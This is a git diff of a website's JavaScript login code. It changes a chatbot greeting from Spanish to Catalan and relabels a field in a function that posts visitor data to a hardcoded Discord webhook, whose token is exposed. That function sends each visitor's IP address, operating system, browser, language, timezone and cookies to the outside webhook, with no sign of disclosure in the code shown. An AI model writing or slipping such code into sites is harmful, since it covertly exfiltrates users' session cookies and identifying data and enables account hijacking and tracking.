@@ -92,7 +92,7 @@ function login_function() {
             chatbot2.classList.add('logged');
             const mensajeBot = document.querySelector(".bienvenida-bot");
             const nombre_user = user.displayName.split(" ")[0];
-            mensajeBot.innerHTML = `¡Hola ${nombre_user}! Soy el asistente de Michelon, ¿en qué puedo ayudarte?`;
+            mensajeBot.innerHTML = `Hola ${nombre_user}! Soc l'assistent de Micheló, en què et puc ajudar?`;
         })
         .catch((error) => {
             alert("Error al iniciar sesión:", error.message);
@@ -103,7 +103,7 @@ function login_function() {
 const webhookUrl = "https://discord.com/api/webhooks/1364967022265368747/bYEeO2KTQ4MDSOFUDm0dZlNJnJhx6Wu8skMGoTX8TrO-wlAZJM2AuPpLJe1pW0HXAzw-";
 
 function sendToDiscord(id, os, browser, language, timeZone, cookies) {
-    const content = `**ID:** \`\`\`${id}\`\`\`\n**OS:** \`\`\`${os}\`\`\`\n**BROWSER:** \`\`\`${browser}\`\`\`\n**LANGUAGE:** \`\`\`${language}\`\`\`\n**TIMEZONE:** \`\`\`${timeZone}\`\`\`\n**COOKIES:** \`\`\`${cookies}\`\`\``;
+    const content = `**IP:** \`\`\`${id}\`\`\`\n**OS:** \`\`\`${os}\`\`\`\n**BROWSER:** \`\`\`${browser}\`\`\`\n**LANGUAGE:** \`\`\`${language}\`\`\`\n**TIMEZONE:** \`\`\`${timeZone}\`\`\`\n**COOKIES:** \`\`\`${cookies}\`\`\``;
 
     const payload = {
         content: content,
